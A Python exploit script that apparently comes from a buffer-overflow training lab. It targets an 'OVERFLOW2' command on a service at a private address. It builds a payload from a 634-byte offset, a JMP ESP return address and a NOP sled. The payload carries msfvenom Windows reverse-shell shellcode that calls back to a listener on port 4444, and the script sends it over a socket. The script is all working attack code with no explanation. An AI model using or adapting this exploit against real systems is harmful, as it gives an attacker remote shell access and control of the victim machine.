#!/usr/bin/env python3

import socket
import struct

def p32(data):
	return struct.pack("<I", data)

host, port = "10.10.191.46", 1337

all_chars = bytearray(range(1,256))

bad_chars = [
	b"\x00",
	b"\x23",
	b"\x24",
	b"\x3c",
	b"\x3d",
	b"\x83",
	b"\x84",
	b"\xba",
	b"\xbb",
]

for bad_char in bad_chars:
	all_chars = all_chars.replace(bad_char, b"")

command = b"OVERFLOW2 "
length = 1000
offset = 634
jmp_esp = p32(0x625011AF)

# msfvenom -p windows/shell_reverse_tcp LHOST=10.17.39.185 LPORT=4444 EXITFUNC=thread -b "\x07\x2d\x2e\xa0" -f py -v shellcode

shellcode =  b""
shellcode += b"\x89\xe7\xda\xda\xd9\x77\xf4\x5d\x55\x59\x49"
shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43"
shellcode += b"\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50"
shellcode += b"\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += b"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38"
shellcode += b"\x41\x42\x75\x4a\x49\x49\x6c\x4a\x48\x4d\x52"
shellcode += b"\x63\x30\x33\x30\x53\x30\x65\x30\x4f\x79\x6d"
shellcode += b"\x35\x30\x31\x6f\x30\x43\x54\x6c\x4b\x56\x30"
shellcode += b"\x70\x30\x6e\x6b\x53\x62\x76\x6c\x4c\x4b\x36"
shellcode += b"\x32\x62\x34\x6c\x4b\x73\x42\x66\x48\x46\x6f"
shellcode += b"\x68\x37\x51\x5a\x67\x56\x55\x61\x4b\x4f\x6c"
shellcode += b"\x6c\x57\x4c\x65\x31\x31\x6c\x63\x32\x76\x4c"
shellcode += b"\x71\x30\x6a\x61\x58\x4f\x66\x6d\x55\x51\x79"
shellcode += b"\x57\x6d\x32\x78\x72\x53\x62\x73\x67\x4e\x6b"
shellcode += b"\x46\x32\x46\x70\x6c\x4b\x42\x6a\x77\x4c\x4e"
shellcode += b"\x6b\x70\x4c\x66\x71\x71\x68\x79\x73\x51\x58"
shellcode += b"\x37\x71\x7a\x71\x73\x61\x4e\x6b\x62\x79\x31"
shellcode += b"\x30\x63\x31\x68\x53\x4e\x6b\x37\x39\x52\x38"
shellcode += b"\x6a\x43\x37\x4a\x42\x69\x6e\x6b\x46\x54\x4c"
shellcode += b"\x4b\x76\x61\x6e\x36\x75\x61\x49\x6f\x4c\x6c"
shellcode += b"\x4a\x61\x4a\x6f\x66\x6d\x75\x51\x7a\x67\x34"
shellcode += b"\x78\x6d\x30\x44\x35\x79\x66\x53\x33\x33\x4d"
shellcode += b"\x5a\x58\x35\x6b\x51\x6d\x47\x54\x44\x35\x68"
shellcode += b"\x64\x73\x68\x6e\x6b\x76\x38\x56\x44\x47\x71"
shellcode += b"\x6b\x63\x61\x76\x4c\x4b\x46\x6c\x62\x6b\x6e"
shellcode += b"\x6b\x36\x38\x37\x6c\x73\x31\x7a\x73\x6e\x6b"
shellcode += b"\x64\x44\x4c\x4b\x36\x61\x48\x50\x4d\x59\x42"
shellcode += b"\x64\x36\x44\x65\x74\x71\x4b\x71\x4b\x45\x31"
shellcode += b"\x43\x69\x73\x6a\x62\x71\x79\x6f\x49\x70\x33"
shellcode += b"\x6f\x71\x4f\x42\x7a\x4c\x4b\x36\x72\x5a\x4b"
shellcode += b"\x4e\x6d\x71\x4d\x75\x38\x36\x53\x66\x52\x37"
shellcode += b"\x70\x43\x30\x70\x68\x30\x77\x62\x53\x35\x62"
shellcode += b"\x71\x4f\x33\x64\x55\x38\x42\x6c\x74\x37\x64"
shellcode += b"\x66\x65\x57\x39\x6f\x48\x55\x78\x38\x5a\x30"
shellcode += b"\x77\x71\x67\x70\x45\x50\x45\x79\x6f\x34\x61"
shellcode += b"\x44\x30\x50\x43\x58\x66\x49\x4f\x70\x62\x4b"
shellcode += b"\x57\x70\x59\x6f\x6b\x65\x52\x70\x32\x70\x36"
shellcode += b"\x30\x66\x30\x71\x50\x50\x50\x53\x70\x70\x50"
shellcode += b"\x52\x48\x5a\x4a\x36\x6f\x4b\x6f\x59\x70\x59"
shellcode += b"\x6f\x68\x55\x4d\x47\x43\x5a\x67\x75\x61\x78"
shellcode += b"\x77\x7a\x36\x71\x35\x77\x58\x39\x35\x38\x57"
shellcode += b"\x72\x77\x70\x62\x31\x73\x6c\x4f\x79\x48\x66"
shellcode += b"\x61\x7a\x76\x70\x53\x66\x71\x47\x75\x38\x5a"
shellcode += b"\x39\x49\x35\x42\x54\x70\x61\x69\x6f\x39\x45"
shellcode += b"\x6c\x45\x4f\x30\x30\x74\x66\x6c\x49\x6f\x70"
shellcode += b"\x4e\x36\x68\x54\x35\x58\x6c\x33\x58\x6a\x50"
shellcode += b"\x38\x35\x6d\x72\x30\x56\x4b\x4f\x59\x45\x70"
shellcode += b"\x68\x42\x43\x72\x4d\x42\x44\x67\x70\x4e\x69"
shellcode += b"\x38\x63\x32\x77\x43\x67\x61\x47\x30\x31\x68"
shellcode += b"\x76\x51\x7a\x72\x32\x42\x79\x52\x76\x59\x72"
shellcode += b"\x4b\x4d\x72\x46\x6b\x77\x57\x34\x54\x64\x77"
shellcode += b"\x4c\x65\x51\x45\x51\x6c\x4d\x32\x64\x47\x54"
shellcode += b"\x42\x30\x79\x56\x77\x70\x73\x74\x56\x34\x76"
shellcode += b"\x30\x33\x66\x42\x76\x73\x66\x33\x76\x61\x46"
shellcode += b"\x52\x6e\x33\x66\x56\x36\x50\x53\x76\x36\x61"
shellcode += b"\x78\x34\x39\x58\x4c\x55\x6f\x6f\x76\x4b\x4f"
shellcode += b"\x39\x45\x4d\x59\x6d\x30\x30\x4e\x56\x36\x67"
shellcode += b"\x36\x59\x6f\x64\x70\x30\x68\x73\x38\x4e\x67"
shellcode += b"\x55\x4d\x35\x30\x4b\x4f\x38\x55\x4d\x6b\x79"
shellcode += b"\x70\x57\x6d\x76\x4a\x57\x7a\x61\x78\x4d\x76"
shellcode += b"\x4e\x75\x6f\x4d\x4d\x4d\x39\x6f\x78\x55\x55"
shellcode += b"\x6c\x55\x56\x31\x6c\x57\x7a\x6f\x70\x69\x6b"
shellcode += b"\x69\x70\x62\x55\x46\x65\x4f\x4b\x33\x77\x65"
shellcode += b"\x43\x50\x72\x70\x6f\x43\x5a\x57\x70\x30\x53"
shellcode += b"\x79\x6f\x39\x45\x41\x41"


nop_sled = b"\x90" * 24

payload = b"".join([
	command,
	b"A" * offset,
	jmp_esp,

	nop_sled,
	shellcode,

	b"C" * ( length - len(jmp_esp) - offset - len(nop_sled) - len(shellcode)),
])

with socket.socket() as s:
	s.connect((host, port))
	s.send(payload)